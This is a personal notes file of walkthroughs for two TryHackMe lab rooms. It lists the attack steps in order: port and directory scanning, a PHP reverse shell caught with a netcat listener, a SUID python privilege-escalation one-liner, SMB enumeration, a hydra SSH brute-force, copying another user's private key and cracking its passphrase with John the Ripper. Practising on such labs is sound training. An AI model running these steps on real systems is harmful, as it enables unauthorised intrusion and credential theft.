HACKS FOR VARIOUS ROOMS IN TryHackME.
-------------------------------------

1.ROOTME
--------

nmap -T4 -p- -A <IP> enumerate the machine to discover open ports

sudo gobuster dir -u 10.10.249.179 -w /usr/share/wordlists/dirb/big.txt [directory busting, hidden directories - of interest is the /panel/ and /uploads]

upload a php reverse shell exploit (edit the IP on which the server will connect back to)

set up a netcat listener and get a shell. [ nc -lvnp 12345] - pops a reverse shell

nmap -T4 -p- -A <ip>

find -name user.txt

find -user root -perm /4000 2>/dev/null

/usr/bin/./python -c 'import os; os.execl("/bin/sh", "sh", "-p")' [GTFO BINS, PRIVESC exploits]




2.BASIC PENTESTING ROOM 
------------------------

THE HACKERSPLOIT WAY...
------------------------

From nmap, open ports: 80, 8080, 8009, 22, 139 and 445.
Samaba smbd is running on port 139 and 445
OpenSSH 7.2p2 on port 22 is usually vulnerable to username enum.

sudo nmap -p80 --script http-enum 10.10.5.72 

To further enum the SMB, we shall use the enume4linux to get any shares available.
enum4linux -a 10.10.5.72
-share names returned: Anonymous and IPC

Try using msb client to log in tto the share.
smbclient  //<IP>/Anonymous
smbclient //<IP>/ipc$

dir [this gets us some listings in this share, including a staff.txt file. We get the two user names here, J and K]

hydra -l jan -P /usr/share/wordlists/rockyou.txt.gz ssh://10.10.5.72 -I [bruteforce with hydra]

this bruteforce gives us a gold mine! jan's password which we can then use to log onto the machine via SSH. [armando is the passwd btw]

cd to kay user account.
under the .ssh dir, we find their public and private keys. copy the private key.
Make the file executable, chmod +x id_rsa
ssh -i id_rsa kay@10.10.5.72 

oh no! This private key has a pass phrase!

No worries, we'll crack using john!

locate ssh2john
cd /usr/share/john/
./ssh2jon.py 

sudo ./ssh2john.py ~/Desktop/THM/id_rsa > ~/Desktop/THM/hash.txt 

nice! the hash starts with $1$. Really? is security a joke to you?? MD5? Disappointing. 
Let's just get over with, JohnTheRipper will do.

sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt.gz  [run in the same dir as hash.txt]
voila! beesewax! caution

THE JOHN HAMMOND WAY.
---------------------

nmap as usual.

sudo gobuster dir -u 10.10.249.179 -w /usr/share/wordlists/dirb/big.txt
/development - dir of interest

enumerate the SMB with enum4linux
enum4linux -a <TARGET IP> | tee enum4linux.log   > to save the log file
this scan gives us the two users, J and K.

From the dev notes, we know that J has a weak passwd. This should be our way in.
